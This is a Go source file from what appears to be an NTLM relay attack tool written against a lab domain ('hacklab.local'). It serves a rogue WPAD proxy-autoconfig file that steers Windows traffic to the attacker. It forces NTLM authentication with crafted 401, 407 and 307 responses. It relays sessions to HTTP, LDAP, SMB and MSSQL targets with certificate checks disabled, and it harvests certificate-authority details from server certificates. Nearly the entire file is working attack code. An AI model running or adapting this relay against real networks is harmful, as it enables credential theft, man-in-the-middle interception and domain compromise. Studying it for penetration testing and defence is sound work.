package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
	"sync"
	"encoding/hex"
	"crypto/rand"
)

var discoveredCAs []CA
var casMutex sync.Mutex

var upstreamByClient = make(map[string]*rawUpstream)
var upstreamMutex sync.Mutex

type HTTPClient struct {
	sess *Session
	upR  *bufio.Reader
	upW  *bufio.Writer
}

type rawUpstream struct {
	conn net.Conn
	br   *bufio.Reader
	host string
	path string
	busy int32 // 0=idle, 1=in use
	configDN string
    baseDN   string
	dcDnsHostName string
}

func (h *HTTPClient) Init(s *Session) error {
	h.sess = s
	h.upR = bufio.NewReader(s.Up.conn)
	h.upW = bufio.NewWriter(s.Up.conn)
	return nil
}

func (h *HTTPClient) KeepAlive() error {
	if err := writeRawGET(h.upW, h.sess.Up.path, h.sess.Up.host, ""); err != nil {
		return err
	}
	resp, err := readHTTPResponse(h.upR)
	if err != nil {
		return err
	}
	_ = drainBody(resp)
	return nil
}

func (h *HTTPClient) SkipAuthentication(down net.Conn) error { return nil }
func (h *HTTPClient) Tunnel(down net.Conn) error              { return pumpHTTP(down, h.sess.Up.conn, h.upR) }
func (h *HTTPClient) Kill() error                             { return h.sess.Up.conn.Close() }
func (h *HTTPClient) IsAdmin() (bool, error)                  { return false, nil }

func pumpHTTP(down net.Conn, up net.Conn, upR *bufio.Reader) error {
	downR := bufio.NewReader(down)
	errCh := make(chan error, 2)

	go func() {
		_, err := io.Copy(down, upR)
		errCh <- err
	}()

	go func() {
		_, err := io.Copy(up, downR)
		errCh <- err
	}()

	err1 := <-errCh
	_ = down.Close()
	_ = up.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	err2 := <-errCh
	_ = up.SetReadDeadline(time.Time{})

	var retErr error
	if !(isConnClosed(err1) || err1 == io.EOF || (err1 != nil && strings.Contains(err1.Error(), "i/o timeout"))) {
		retErr = err1
	}
	if retErr == nil && !(isConnClosed(err2) || err2 == io.EOF || (err2 != nil && strings.Contains(err2.Error(), "i/o timeout"))) {
		retErr = err2
	}
	return retErr
}

func dumpHTTPRequest(r *http.Request) {
	fmt.Printf("%s %s %s\n", r.Method, r.URL.RequestURI(), r.Proto)
	fmt.Printf("Host: %s\n", r.Host)
	for k, v := range r.Header {
		fmt.Printf("%s: %s\n", k, strings.Join(v, ", "))
	}
	fmt.Printf("\n")
}

func dumpMyHTTPResponse(status int, hdr http.Header) {
	fmt.Printf("Our response:\n")
	fmt.Printf("%d %s\n", status, http.StatusText(status))
	for k, v := range hdr {
		fmt.Printf("%s: %s\n", k, strings.Join(v, ", "))
	}
	fmt.Printf("\n")
}

func isProxyRequest(r *http.Request) bool {
	if r.Method == http.MethodConnect {
		return true
	}
	uri := r.RequestURI
	if strings.HasPrefix(uri, "http://") || strings.HasPrefix(uri, "https://") {
		return true
	}
	return r.Header.Get("Proxy-Authorization") != ""
}

// generate a random hex token for user tracking
func genToken(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// create token for state and register in global map
func ensureTokenForState(state *clientState) string {
	if state.token != "" {
		return state.token
	}

	// create persistent per-user state with token
	perUser := &clientState{
		targets:     append([]string{}, state.targets...),
		currentUser: state.currentUser,
		targetIndex: state.targetIndex,
		token:       "",
	}

	token := genToken(4)
	perUser.token = token
	tokenStates.Store(token, perUser)

	return token
}

// build redirect location with token as query string: http://<host>/<path>?<token>
func buildRedirectLocation(state *clientState, r *http.Request) (loc string, token string) {
	token = ensureTokenForState(state)

	path := r.URL.Path
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	
	// add token as a query string, maintain original query params
	if r.URL.RawQuery != "" {
		loc = path + "?" + token + "&" + r.URL.RawQuery
	} else {
		loc = path + "?" + token
	}
	return loc, token
}

// returns a consistent representation of the target across different connection types for logging
func getTargetForLogging(r *http.Request) string {
	if r.Method == "CONNECT" {
		// CONNECT requests have the authority in URL
		return r.URL.String()
	}
	
	// proxy requests - URL should be absolute with host
	if r.URL.IsAbs() {
		// build full URL with query string
		url := r.URL.Scheme + "://" + r.URL.Host + r.URL.Path
		if r.URL.RawQuery != "" {
			url += "?" + r.URL.RawQuery
		}
		return url
	}
	
	// direct requests - construct from host header and path
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	
	path := r.URL.Path
	if path == "" {
		path = "/"
	}
	
	if r.Host != "" {
		target := scheme + "://" + r.Host + path
		if r.URL.RawQuery != "" {
			target += "?" + r.URL.RawQuery
		}
		return target
	}
	
	// fallback - just path and query
	if r.URL.RawQuery != "" {
		return path + "?" + r.URL.RawQuery
	}
	return path
}

func redirectAuth(w http.ResponseWriter, r *http.Request, proxy bool) {
	now := time.Now().Format("15:04:05")
	if proxy {
		log.Printf("%s%s%s [HTTP]%s %s redirecting (proxy). Sending 307 with Proxy-Authenticate: NTLM%s",
			Grey, now, Reset, Grey, r.RemoteAddr, Reset)
		if debug {
			dumpHTTPRequest(r)
		}
		w.Header().Set("Proxy-Authenticate", "NTLM")
		w.Header().Set("Location", r.RequestURI)
		w.WriteHeader(http.StatusTemporaryRedirect) // 307
		if debug {
			dumpMyHTTPResponse(http.StatusTemporaryRedirect, w.Header())
		}
		return
	}

	log.Printf("%s%s%s [HTTP]%s %s redirecting. Sending 307 with WWW-Authenticate: NTLM%s",
		Grey, now, Reset, Grey, r.RemoteAddr, Reset)
	if debug {
		dumpHTTPRequest(r)
	}
	w.Header().Set("WWW-Authenticate", "NTLM")
	w.Header().Set("Location", r.RequestURI)
	w.WriteHeader(http.StatusTemporaryRedirect) // 307
	if debug {
		dumpMyHTTPResponse(http.StatusTemporaryRedirect, w.Header())
	}
}

func promptAuth(w http.ResponseWriter, r *http.Request, proxy bool) {
	now := time.Now().Format("15:04:05")
	targetInfo := getTargetForLogging(r)

	if proxy {
		log.Printf("%s%s%s [HTTP]%s %s %s %s proxy request to %s. No auth header. Sending 407%s", 
			Grey, now, Reset, Grey, r.RemoteAddr, r.Method, r.Proto, targetInfo, Reset)
		w.Header().Set("Proxy-Authenticate", "NTLM")
		w.WriteHeader(http.StatusProxyAuthRequired)
		return
	}

	log.Printf("%s%s%s [HTTP]%s %s %s %s to %s. No auth header. Sending 401%s", 
		Grey, now, Reset, Grey, r.RemoteAddr, r.Method, r.Proto, targetInfo, Reset)
	w.Header().Set("WWW-Authenticate", "NTLM")
	w.WriteHeader(http.StatusUnauthorized)
}

func serveWPAD(w http.ResponseWriter, r *http.Request, proxyIPv4, proxyIPv6, wpadHostname string) {
	now := time.Now().Format("15:04:05")
	if verbose {
		log.Printf("%s%s%s [WPAD]%s %s requested %s (Host: %s)%s", 
			Grey, now, Reset, Grey, r.RemoteAddr, r.URL.Path, r.Host, Reset)
	}
	if r.URL.Path == "/wpad.dat" || r.URL.Path == "/proxy.pac" {
		// build proxy string based on available IPs
		var proxyStr string
		if proxyIPv4 != "" && proxyIPv6 != "" {
			proxyStr = fmt.Sprintf("PROXY %s:80; PROXY [%s]:80; DIRECT", proxyIPv4, proxyIPv6)
		} else if proxyIPv4 != "" {
			proxyStr = fmt.Sprintf("PROXY %s:80; DIRECT", proxyIPv4)
		} else {
			proxyStr = fmt.Sprintf("PROXY [%s]:80; DIRECT", proxyIPv6)
		}
		
		wpadContent := `function FindProxyForURL(url, host) {
if ((host == "localhost") || shExpMatch(host, "localhost.*") || (host == "127.0.0.1")) {
	return "DIRECT";
}
if (dnsDomainIs(host, "` + wpadHostname + `")) {
	return "DIRECT";
}
if ((dnsDomainIs(host, ".msftconnecttest.com")) ||
	(dnsDomainIs(host, ".windowsupdate.com")) ||
	(dnsDomainIs(host, "edge.microsoft.com")) ||
	(dnsDomainIs(host, ".live.com")) ||
	(dnsDomainIs(host, "settings-win.data.microsoft.com")) ||
	(dnsDomainIs(host, "events.data.microsoft.com"))) {
	return "` + proxyStr + `";
}
if (dnsDomainIs(host, ".hacklab.local") || (host == "hacklab.local")) {
	return "` + proxyStr + `";
}
return "DIRECT";
}`

		w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(wpadContent))
		if verbose {
			log.Printf("%s%s%s [WPAD]%s Served WPAD to %s%s", 
				Grey, now, Reset, Yellow, r.RemoteAddr, Reset)
		}
		return
	}
	http.NotFound(w, r)
}

/*
//ipv6 only version for wpad
func serveWPAD(w http.ResponseWriter, r *http.Request, proxyIPv6, wpadHostname string) {
    now := time.Now().Format("15:04:05")
    
	if verbose { log.Printf("%s%s%s [HTTP]%s %s %s to %s%s%s", Grey, now, Reset, Grey, r.RemoteAddr, r.Method, r.Host, r.URL.String(), Reset) }
    
    if r.URL.Path == "/wpad.dat" || r.URL.Path == "/proxy.pac" {
        proxyStr := fmt.Sprintf("PROXY [%s]:80; DIRECT", proxyIPv6)
        
        wpadContent := fmt.Sprintf(`function FindProxyForURL(url, host) {
    if ((host == "localhost") || shExpMatch(host, "localhost.*") || (host == "127.0.0.1")) 
        return "DIRECT";
    if (dnsDomainIs(host, "hacklab.local")) 
        return "DIRECT";
    return "%s";
}`, proxyStr)
        
        w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
        w.WriteHeader(http.StatusOK)
        w.Write([]byte(wpadContent))
        
        if verbose {
            log.Printf("%s%s%s [WPAD]%s Served WPAD to %s (hostname: %s, proxy: %s)%s", 
                Grey, now, Reset, Green, r.RemoteAddr, wpadHostname, proxyStr, Reset)
        }
        return
    }
    
    http.NotFound(w, r)
}
*/
func getAuthHeader(obj any) string {
	switch v := obj.(type) {
	case *http.Request:
		// check proxy first
		if s := v.Header.Get("Proxy-Authorization"); s != "" {
			return s
		}
		if s := v.Header.Get("Authorization"); s != "" {
			return s
		}
	case *http.Response:
		// same logic for responses
		if s := v.Header.Get("Proxy-Authenticate"); s != "" {
			return s
		}
		if s := v.Header.Get("WWW-Authenticate"); s != "" {
			return s
		}
	}
	return ""
}

func endRelay(w http.ResponseWriter) {
	w.Header().Del("WWW-Authenticate")
	w.Header().Del("Proxy-Authenticate")
	w.Header().Set("Connection", "close")
	w.Header().Set("Content-Length", "0")
	w.WriteHeader(http.StatusOK)
}

func parseTarget(u *url.URL) (hostport, hostHdr, path string) {
	hostport = u.Host
		if !strings.Contains(hostport, ":") {
			switch u.Scheme {
			case "https":
				hostport += ":443"
			case "ldaps":
				hostport += ":636"
			case "ldap":
				hostport += ":389"
			case "smb":
				hostport += ":445"
			case "mssql":
				hostport += ":1433"
			default:
				hostport += ":80"
			}
		}
	hostHdr = u.Host
	path = u.RequestURI()
	return
}

func writeRawGET(bw *bufio.Writer, path, host, auth string) error {
	ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0."
	lines := []string{
		fmt.Sprintf("GET %s HTTP/1.1", path),
		fmt.Sprintf("Host: %s", host),
		"Connection: keep-alive",
		"Accept: */*",
		"Accept-Encoding: identity",
		"Pragma: no-cache",
		"Cache-Control: no-cache",
		fmt.Sprintf("User-Agent: %s", ua),
	}
	if auth != "" {
		lines = append(lines, "Authorization: "+auth)
	}
	lines = append(lines, "\r\n")
	raw := strings.Join(lines, "\r\n")
	if debug {
		fmt.Printf("RAW ->\n%s", raw)
	}
	if _, err := bw.WriteString(raw); err != nil {
		return err
	}
	return bw.Flush()
}

func readHTTPResponse(br *bufio.Reader) (*http.Response, error) {
	dummy := &http.Request{Method: "GET"}
	resp, err := http.ReadResponse(br, dummy)
	if err != nil {
		return nil, err
	}
	if debug {
		fmt.Printf("RAW <- %s %s\n", resp.Proto, resp.Status)
		for k, vals := range resp.Header {
			fmt.Printf("%s: %s\n", k, strings.Join(vals, ", "))
		}
		fmt.Println()
	}
	return resp, nil
}

func drainBody(resp *http.Response) error {
	_, err := io.Copy(io.Discard, resp.Body)
	return err
}

func getOrCreateUpstream(key string, u *url.URL) (*rawUpstream, error) {
	upstreamMutex.Lock()
	defer upstreamMutex.Unlock()
	
	if up, ok := upstreamByClient[key]; ok {
		return up, nil
	}
	
	hostport, hostHdr, path := parseTarget(u)
	conn, err := net.DialTimeout("tcp4", hostport, 5*time.Second)
	if err != nil {
		return nil, err
	}
	
	var finalConn net.Conn = conn
	if u.Scheme == "https" || u.Scheme == "ldaps" {
		serverName := hostHdr
		if h, _, err := net.SplitHostPort(hostHdr); err == nil {
			serverName = h
		}
		tcfg := &tls.Config{ServerName: serverName, InsecureSkipVerify: true}
		tlsConn := tls.Client(conn, tcfg)
		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			return nil, fmt.Errorf("tls handshake failed: %w", err)
		}
		// Extract CA information from certificate
		extractCAFromCert(tlsConn)
		finalConn = tlsConn
	}
	
	up := &rawUpstream{
		conn: finalConn,
		br:   bufio.NewReaderSize(finalConn, 16384),
		host: hostHdr,
		path: path,
	}
	
	upstreamByClient[key] = up
	return up, nil
}

func extractCAFromCert(tlsConn *tls.Conn) {
	state := tlsConn.ConnectionState()
	if len(state.PeerCertificates) == 0 {
		return
	}
	
	cert := state.PeerCertificates[0]
	now := time.Now().Format("15:04:05")
	
	var ca CA
	var domain string
	
	// Extract domain from DNS names in certificate
	for _, dns := range cert.DNSNames {
		if strings.Contains(dns, ".") {
			parts := strings.Split(dns, ".")
			if len(parts) > 1 {
				domain = strings.Join(parts[1:], ".")
				break
			}
		}
	}
	
	// Extract CA hostname from CRL Distribution Points
	// Format: ldap:///CN=hacklab-CA,CN=CA01,CN=CDP,...
	for _, crlURL := range cert.CRLDistributionPoints {
		if strings.HasPrefix(crlURL, "ldap:///") {
			// Parse the DN to extract CA hostname
			dn := strings.TrimPrefix(crlURL, "ldap:///")
			if idx := strings.Index(dn, "?"); idx > 0 {
				dn = dn[:idx]
			}
			
			// Split by comma and look for CN values
			parts := strings.Split(dn, ",")
			for i, part := range parts {
				part = strings.TrimSpace(part)
				if strings.HasPrefix(part, "CN=") {
					cnValue := strings.TrimPrefix(part, "CN=")
					
					// First CN is usually the CA name
					if i == 0 {
						ca.cn = cnValue
					}
					// Second CN is often the CA hostname
					if i == 1 && ca.host == "" {
						ca.host = cnValue
					}
				}
			}
			
			if ca.cn != "" || ca.host != "" {
				break
			}
		}
	}
	
	// If we found CA info, save it
	if ca.cn != "" || ca.host != "" {
		casMutex.Lock()
		defer casMutex.Unlock()
		
		// Check if already exists
		exists := false
		for _, existingCA := range discoveredCAs {
			if existingCA.cn == ca.cn && existingCA.host == ca.host {
				exists = true
				break
			}
		}
		
		if !exists {
			discoveredCAs = append(discoveredCAs, ca)
			
			// Build FQDN if we have both hostname and domain
			if ca.host != "" && domain != "" {
				fqdn := ca.host + "." + domain
				if ca.cn != "" {
					log.Printf("%s%s%s [TLS] Discovered CA from certificate: %s (%s)%s", 
						Grey, now, Reset, fqdn, ca.cn, Reset)
				} else {
					log.Printf("%s%s%s [TLS] Discovered CA from certificate: %s%s", 
						Grey, now, Reset, fqdn, Reset)
				}
			} else if ca.host != "" && ca.cn != "" {
				log.Printf("%s%s%s [TLS] Discovered CA from certificate: %s (%s)%s", 
					Grey, now, Reset, ca.host, ca.cn, Reset)
			} else if ca.cn != "" {
				log.Printf("%s%s%s [TLS] Discovered CA from certificate: %s%s", 
					Grey, now, Reset, ca.cn, Reset)
			}
		}
	}
}

func probeNTLMAuth(targetURL string) (bool, error) {
    // Create HTTP client with timeout
    client := &http.Client{
        Timeout: 5 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Skip verification for testing
        },
    }

    // Send GET request
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return false, fmt.Errorf("failed to create request for %s: %v", targetURL, err)
    }
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")

    resp, err := client.Do(req)
    if err != nil {
        return false, fmt.Errorf("request to %s failed: %v", targetURL, err)
    }
    defer resp.Body.Close()

    // Check for 401 status and NTLM or Negotiate in WWW-Authenticate header
    if resp.StatusCode != http.StatusUnauthorized {
        return false, fmt.Errorf("expected 401 Unauthorized, got %d %s", resp.StatusCode, resp.Status)
    }

    authHeader := strings.ToLower(resp.Header.Get("WWW-Authenticate"))
    if !strings.Contains(authHeader, "ntlm") && !strings.Contains(authHeader, "negotiate") {
        return false, fmt.Errorf("neither NTLM nor Negotiate in WWW-Authenticate header: %s", authHeader)
    }

	if verbose {
		now := time.Now().Format("15:04:05")
		log.Printf("%s%s%s [HTTP] %s accepts NTLM authentication %s\n", Grey, now, Reset, targetURL, Reset)
	}
    return true, nil
}

func removeUpstream(up *rawUpstream) {
	for k, v := range upstreamByClient {
		if v == up {
			delete(upstreamByClient, k)
			break
		}
	}
	if up.conn != nil {
		up.conn.Close()
	}
}

func keepAliveProbe(up *rawUpstream, interval time.Duration, scheme string) {
	t := time.NewTicker(interval)
	defer t.Stop()
	for range t.C {
		if atomic.LoadInt32(&up.busy) != 0 {
			continue
		}
		if debug {
			now := time.Now().Format("15:04:05")
			log.Printf("%s%s%s [PROBE]%s keepalive to %s%s", Grey, now, Reset, Grey, up.host, Reset)
		}
		_ = up.conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		_ = up.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		if scheme == "http" || scheme == "https" {
			_, err := fmt.Fprintf(up.conn, "HEAD %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", up.path, up.host)
			if err != nil {
				removeUpstream(up)
				return
			}
			if resp, err := readHTTPResponse(up.br); err == nil {
				_ = drainBody(resp)
			}
		} else if scheme == "ldap" || scheme == "ldaps" {
			mid := ldapMessageID.Add(1)
			if err := sendRootDSEQuery(up.conn, mid); err != nil {
				removeUpstream(up)
				return
			}
			_ = consumeSearchDone(up.br, mid, 3*time.Second) // ignore error
		}
		_ = up.conn.SetWriteDeadline(time.Time{})
		_ = up.conn.SetReadDeadline(time.Time{})
	}
}